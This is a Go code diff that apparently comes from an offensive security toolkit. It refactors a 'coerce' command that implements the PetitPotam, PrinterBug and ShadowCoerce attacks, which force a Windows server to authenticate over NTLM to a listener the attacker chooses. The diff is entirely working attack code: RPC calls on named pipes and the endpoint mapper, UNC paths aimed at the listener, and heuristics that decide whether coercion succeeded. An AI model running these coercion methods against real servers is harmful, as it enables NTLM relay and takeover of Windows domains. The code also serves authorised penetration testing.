@@ -4,6 +4,7 @@ import (
 	"context"
 	"encoding/json"
 	"fmt"
+	"net"
 	"strings"
 	"time"
 
@@ -11,6 +12,7 @@ import (
 
 	"github.com/oiweiwei/go-msrpc/dcerpc"
 	efsrpc "github.com/oiweiwei/go-msrpc/msrpc/efsr/efsrpc/v1"
+	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
 	fsrvp "github.com/oiweiwei/go-msrpc/msrpc/fsrvp/fileservervssagent/v1"
 	winspool "github.com/oiweiwei/go-msrpc/msrpc/rprn/winspool/v1"
 	"github.com/oiweiwei/go-msrpc/ssp"
@@ -19,6 +21,21 @@ import (
 
 	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
 )
+
+func init() {
+	// Register SPNEGO and NTLM globally — required for SMB named pipe transport.
+	// go-msrpc's SMB2 layer creates its own security context internally and looks
+	// up mechanisms from the global store. Per-context WithMechanismFactory (used
+	// by dcsync etc. for TCP) still works since context-local stores take priority.
+	// Use recover to handle "mechanism already exist" panic if called multiple times.
+	coerceSafeAddMechanism(ssp.SPNEGO)
+	coerceSafeAddMechanism(ssp.NTLM)
+}
+
+func coerceSafeAddMechanism(m gssapi.MechanismFactory) {
+	defer func() { recover() }()
+	gssapi.AddMechanism(m)
+}
 
 type CoerceCommand struct{}
 
@@ -183,10 +200,13 @@ func coerceExecuteMethod(method, server, listener string, cred sspcred.Credentia
 	}
 }
 
-// coerceDialNamedPipe connects to a target via SMB named pipe (ncacn_np)
-func coerceDialNamedPipe(ctx context.Context, server, pipeName string) (dcerpc.Conn, error) {
-	endpoint := fmt.Sprintf("ncacn_np:[%s]", pipeName)
-	return dcerpc.Dial(ctx, server, dcerpc.WithEndpoint(endpoint))
+// coerceNewContext creates a GSSAPI security context with credentials and timeout.
+func coerceNewContext(cred sspcred.Credential, timeout int) (context.Context, context.CancelFunc) {
+	return context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
+		gssapi.WithCredential(cred),
+		gssapi.WithMechanismFactory(ssp.SPNEGO),
+		gssapi.WithMechanismFactory(ssp.NTLM),
+	), time.Duration(timeout)*time.Second)
 }
 
 // coerceIsRPCProcessed checks if an error indicates the RPC call was actually
@@ -197,17 +217,17 @@ func coerceIsRPCProcessed(err error) bool {
 	}
 	errStr := err.Error()
 	// These Win32/NTSTATUS errors mean the server processed the RPC call
-	// and tried (or refused) the file operation — coercion was triggered
+	// and tried (or refused) the file/print operation — coercion was triggered
 	processedIndicators := []string{
-		"ERROR_BAD_NETPATH",      // target tried to resolve the UNC path
-		"ERROR_ACCESS_DENIED",    // path processed but access denied
-		"ERROR_BAD_NET_NAME",     // UNC share name not found (tried to connect)
-		"ERROR_NOT_FOUND",        // resource not found (call processed)
+		"ERROR_BAD_NETPATH",       // target tried to resolve the UNC path
+		"ERROR_ACCESS_DENIED",     // path processed but access denied
+		"ERROR_BAD_NET_NAME",      // UNC share name not found (tried to connect)
+		"ERROR_NOT_FOUND",         // resource not found (call processed)
 		"ERROR_INVALID_PARAMETER", // parameter error (call reached handler)
-		"0x00000035",             // BAD_NETPATH numeric
-		"0x00000005",             // ACCESS_DENIED numeric
+		"0x00000035",              // BAD_NETPATH numeric
+		"0x00000005",              // ACCESS_DENIED numeric
 		"RPC_S_SERVER_UNAVAILABLE", // server tried to reach listener, listener not there
-		"0x000006ba",             // RPC_S_SERVER_UNAVAILABLE numeric
+		"0x000006ba",              // RPC_S_SERVER_UNAVAILABLE numeric
 	}
 	for _, indicator := range processedIndicators {
 		if strings.Contains(errStr, indicator) {
@@ -218,22 +238,19 @@ func coerceIsRPCProcessed(err error) bool {
 }
 
 // coercePetitPotam uses MS-EFSR EfsRpcOpenFileRaw to trigger NTLM auth.
-// Tries efsrpc pipe first, then lsarpc as fallback (original PetitPotam technique).
+// Uses named pipes (ncacn_np) — tries efsrpc pipe first, then lsarpc fallback.
 func coercePetitPotam(server, listener string, cred sspcred.Credential, timeout int) coerceResult {
 	coercePath := fmt.Sprintf(`\\%s\share\file.txt`, listener)
 
-	// Try efsrpc pipe first, then lsarpc as fallback
+	// Try efsrpc pipe first, then lsarpc (original PetitPotam technique)
 	pipes := []string{"efsrpc", "lsarpc"}
 	var lastErr error
 
 	for _, pipe := range pipes {
-		ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
-			gssapi.WithCredential(cred),
-			gssapi.WithMechanismFactory(ssp.SPNEGO),
-			gssapi.WithMechanismFactory(ssp.NTLM),
-		), time.Duration(timeout)*time.Second)
+		ctx, cancel := coerceNewContext(cred, timeout)
 
-		cc, err := coerceDialNamedPipe(ctx, server, pipe)
+		endpoint := fmt.Sprintf("ncacn_np:[%s]", pipe)
+		cc, err := dcerpc.Dial(ctx, server, dcerpc.WithEndpoint(endpoint))
 		if err != nil {
 			lastErr = fmt.Errorf("pipe %s: %v", pipe, err)
 			cancel()
@@ -256,14 +273,12 @@ func coercePetitPotam(server, listener string, cred sspcred.Credential, timeout 
 		cc.Close(ctx)
 		cancel()
 
-		if err == nil {
-			return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: true,
-				Message: fmt.Sprintf("EfsRpcOpenFileRaw via \\\\%s\\pipe\\%s (path: %s)", server, pipe, coercePath)}
-		}
-
-		if coerceIsRPCProcessed(err) {
-			return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: true,
-				Message: fmt.Sprintf("EfsRpcOpenFileRaw via \\\\%s\\pipe\\%s (path: %s, response: %v)", server, pipe, coercePath, err)}
+		if err == nil || coerceIsRPCProcessed(err) {
+			msg := fmt.Sprintf("EfsRpcOpenFileRaw via \\\\%s\\pipe\\%s (path: %s)", server, pipe, coercePath)
+			if err != nil {
+				msg += fmt.Sprintf(" [response: %v]", err)
+			}
+			return coerceResult{Method: "PetitPotam (MS-EFSR)", Success: true, Message: msg}
 		}
 
 		lastErr = fmt.Errorf("pipe %s: %v", pipe, err)
@@ -273,29 +288,30 @@ func coercePetitPotam(server, listener string, cred sspcred.Credential, timeout 
 		Message: fmt.Sprintf("all pipes failed: %v", lastErr)}
 }
 
-// coercePrinterBug uses MS-RPRN RpcRemoteFindFirstPrinterChangeNotification
+// coercePrinterBug uses MS-RPRN RpcRemoteFindFirstPrinterChangeNotification.
+// Uses TCP+EPM (RPRN is registered in the Endpoint Mapper).
 func coercePrinterBug(server, listener string, cred sspcred.Credential, timeout int) coerceResult {
-	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
-		gssapi.WithCredential(cred),
-		gssapi.WithMechanismFactory(ssp.SPNEGO),
-		gssapi.WithMechanismFactory(ssp.NTLM),
-	), time.Duration(timeout)*time.Second)
+	ctx, cancel := coerceNewContext(cred, timeout)
 	defer cancel()
 
-	cc, err := coerceDialNamedPipe(ctx, server, "spoolss")
+	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+server,
+		epm.EndpointMapper(ctx,
+			net.JoinHostPort(server, "135"),
+			dcerpc.WithInsecure(),
+		))
 	if err != nil {
 		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
-			Message: fmt.Sprintf("connection to \\\\%s\\pipe\\spoolss failed: %v", server, err)}
+			Message: fmt.Sprintf("connection failed: %v", err)}
 	}
 	defer cc.Close(ctx)
 
-	cli, err := winspool.NewWinspoolClient(ctx, cc, dcerpc.WithSeal())
+	cli, err := winspool.NewWinspoolClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(server))
 	if err != nil {
 		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
-			Message: fmt.Sprintf("winspool bind failed: %v", err)}
+			Message: fmt.Sprintf("winspool client failed: %v", err)}
 	}
 
-	// Step 1: Open printer on the target server (use SERVER_ACCESS_ENUMERATE only)
+	// Open printer with default access (any authenticated user can do this)
 	printerName := fmt.Sprintf(`\\%s`, server)
 	openResp, err := cli.OpenPrinter(ctx, &winspool.OpenPrinterRequest{
 		PrinterName:      printerName,
@@ -303,11 +319,11 @@ func coercePrinterBug(server, listener string, cred sspcred.Credential, timeout 
 		AccessRequired:   0x00020008, // SERVER_ACCESS_ENUMERATE | SERVER_ACCESS_ADMINISTER
 	})
 	if err != nil {
-		// Try with lower access rights
+		// Retry with lower access rights
 		openResp, err = cli.OpenPrinter(ctx, &winspool.OpenPrinterRequest{
 			PrinterName:      printerName,
 			DevModeContainer: &winspool.DevModeContainer{},
-			AccessRequired:   0x00000002, // SERVER_ACCESS_ENUMERATE
+			AccessRequired:   0, // Default access
 		})
 		if err != nil {
 			return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
@@ -315,40 +331,36 @@ func coercePrinterBug(server, listener string, cred sspcred.Credential, timeout 
 		}
 	}
 
-	// Step 2: RemoteFindFirstPrinterChangeNotification triggers auth to listener
+	// RpcRemoteFindFirstPrinterChangeNotification triggers auth to listener
 	listenerHost := fmt.Sprintf(`\\%s`, listener)
-	_, err = cli.RemoteFindFirstPrinterChangeNotification(ctx, &winspool.RemoteFindFirstPrinterChangeNotificationRequest{
-		Printer:      openResp.Handle,
-		Flags:        0x00000100, // PRINTER_CHANGE_ADD_JOB
-		Options:      0,
-		LocalMachine: listenerHost,
-		PrinterLocal: 0,
-	})
+	_, err = cli.RemoteFindFirstPrinterChangeNotification(ctx,
+		&winspool.RemoteFindFirstPrinterChangeNotificationRequest{
+			Printer:      openResp.Handle,
+			Flags:        0x00000100, // PRINTER_CHANGE_ADD_JOB
+			Options:      0,
+			LocalMachine: listenerHost,
+			PrinterLocal: 0,
+		})
 
-	if err == nil {
-		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: true,
-			Message: fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification via \\\\%s\\pipe\\spoolss (listener: %s)", server, listenerHost)}
-	}
-
-	if coerceIsRPCProcessed(err) {
-		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: true,
-			Message: fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification via \\\\%s\\pipe\\spoolss (listener: %s, response: %v)", server, listenerHost, err)}
+	if err == nil || coerceIsRPCProcessed(err) {
+		msg := fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification (listener: %s)", listenerHost)
+		if err != nil {
+			msg += fmt.Sprintf(" [response: %v]", err)
+		}
+		return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: true, Message: msg}
 	}
 
 	return coerceResult{Method: "PrinterBug (MS-RPRN)", Success: false,
 		Message: fmt.Sprintf("RpcRemoteFindFirstPrinterChangeNotification failed: %v", err)}
 }
 
-// coerceShadowCoerce uses MS-FSRVP IsPathShadowCopied to trigger NTLM auth
+// coerceShadowCoerce uses MS-FSRVP IsPathShadowCopied to trigger NTLM auth.
+// Uses named pipes (ncacn_np) — requires File Server VSS Agent service.
 func coerceShadowCoerce(server, listener string, cred sspcred.Credential, timeout int) coerceResult {
-	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background(),
-		gssapi.WithCredential(cred),
-		gssapi.WithMechanismFactory(ssp.SPNEGO),
-		gssapi.WithMechanismFactory(ssp.NTLM),
-	), time.Duration(timeout)*time.Second)
+	ctx, cancel := coerceNewContext(cred, timeout)
 	defer cancel()
 
-	cc, err := coerceDialNamedPipe(ctx, server, "FssagentRpc")
+	cc, err := dcerpc.Dial(ctx, server, dcerpc.WithEndpoint("ncacn_np:[FssagentRpc]"))
 	if err != nil {
 		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
 			Message: fmt.Sprintf("connection to \\\\%s\\pipe\\FssagentRpc failed (service may not be running): %v", server, err)}
@@ -361,20 +373,17 @@ func coerceShadowCoerce(server, listener string, cred sspcred.Credential, timeou
 			Message: fmt.Sprintf("FSRVP bind failed (service may not be running): %v", err)}
 	}
 
-	// IsPathShadowCopied with UNC path pointing to listener triggers NTLM auth
 	coercePath := fmt.Sprintf(`\\%s\share`, listener)
 	_, err = cli.IsPathShadowCopied(ctx, &fsrvp.IsPathShadowCopiedRequest{
 		ShareName: coercePath,
 	})
 
-	if err == nil {
-		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: true,
-			Message: fmt.Sprintf("IsPathShadowCopied via \\\\%s\\pipe\\FssagentRpc (path: %s)", server, coercePath)}
-	}
-
-	if coerceIsRPCProcessed(err) {
-		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: true,
-			Message: fmt.Sprintf("IsPathShadowCopied via \\\\%s\\pipe\\FssagentRpc (path: %s, response: %v)", server, coercePath, err)}
+	if err == nil || coerceIsRPCProcessed(err) {
+		msg := fmt.Sprintf("IsPathShadowCopied via \\\\%s\\pipe\\FssagentRpc (path: %s)", server, coercePath)
+		if err != nil {
+			msg += fmt.Sprintf(" [response: %v]", err)
+		}
+		return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: true, Message: msg}
 	}
 
 	return coerceResult{Method: "ShadowCoerce (MS-FSRVP)", Success: false,
